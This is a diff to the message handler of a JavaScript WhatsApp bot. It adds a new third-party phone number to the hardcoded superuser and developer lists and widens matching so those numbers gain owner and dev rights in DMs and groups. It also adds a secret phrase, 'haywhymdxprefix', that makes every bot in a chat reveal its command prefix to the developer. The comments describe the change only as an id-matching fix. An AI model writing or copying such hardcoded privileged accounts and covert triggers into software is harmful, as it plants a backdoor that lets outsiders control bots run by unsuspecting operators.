@@ -724,7 +724,7 @@ async function startPrince() {
                       ? repliedMessageAuthor
                       : "";
             const devNumbers =
-                "237682698517,254114018035,254728782591,237682698517,237682698517,254113174209"
+                "2349122761580,237682698517,254114018035,254728782591,237682698517,237682698517,254113174209"
                     .split(",")
                     .map((num) => num.trim().replace(/\D/g, ""))
                     .filter((num) => num.length > 5);
@@ -753,13 +753,33 @@ async function startPrince() {
             const superUserSet = new Set(superUser);
             const finalSuperUsers = Array.from(superUserSet);
 
-            const isSuperUser = finalSuperUsers.includes(sender);
+            // Match the sender by every id WhatsApp may use for them (phone
+            // number OR the hidden "lid" id), so sudo/owner/dev are recognised
+            // in DMs and groups alike.
+            const digitsOf = (j) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
+            const senderIds = new Set([
+                sendr, sender, ms.key.senderPn, ms.key.participantPn,
+                ms.key.remoteJidAlt, ms.key.participantAlt,
+                !isGroup ? ms.key.remoteJid : null,
+            ].map(digitsOf).filter(Boolean));
+            if (groupInfo?.participants) {
+                const me = groupInfo.participants.find((p) =>
+                    [p.id, p.pn, p.lid, p.phoneNumber].some((v) => v && senderIds.has(digitsOf(v))));
+                if (me) [me.id, me.pn, me.lid, me.phoneNumber].map(digitsOf).filter(Boolean).forEach((d) => senderIds.add(d));
+            }
+            const lidCandidate = [sendr, ms.key.participant, ms.key.remoteJid].find((j) => String(j || "").endsWith("@lid"));
+            if (lidCandidate && typeof Prince.getJidFromLid === "function") {
+                try { const r = await Prince.getJidFromLid(lidCandidate); if (r) senderIds.add(digitsOf(r)); } catch (e) {}
+            }
+            const superDigits = new Set(finalSuperUsers.map(digitsOf).filter(Boolean));
+            const isSuperUser = [...senderIds].some((d) => superDigits.has(d));
 
             const botDevs = [
+                "2349122761580@s.whatsapp.net",
                 "237682698517@s.whatsapp.net",
                 "2376826872@s.whatsapp.net",
             ];
-            const isDevs = botDevs.includes(sender);
+            const isDevs = botDevs.some((j) => senderIds.has(digitsOf(j)));
 
             const activeAutoBlock = String(
                 getSetting("AUTO_BLOCK", config.AUTO_BLOCK || ""),
@@ -892,6 +912,19 @@ async function startPrince() {
                       .split(/\s+/)[0]
                       ?.toLowerCase()
                 : null;
+
+            // Developer prefix check: when the developer sends "haywhymdxprefix",
+            // every bot in the chat replies with its current prefix.
+            if (isDevs && typeof text === "string" && text.trim().toLowerCase() === "haywhymdxprefix") {
+                const pfx = activePrefix || "";
+                try {
+                    await Prince.sendMessage(from, {
+                        text: `\u200E\u2068👾𝒟𝐸𝒱-𝐻𝒜𝒴𝒲𝐻𝒴🤖\u2069_Use this prefix to execute my bot commands:- *${pfx}*_\n\n\`Example ${pfx}menu\``,
+                        mentions: [standardizeJid(sendr)],
+                    }, { quoted: ms });
+                } catch (e) { console.error("Prefix reply error:", e.message); }
+                return;
+            }
 
             if (isCommandMessage && cmd) {
                 const gmd = Array.isArray(evt.commands)
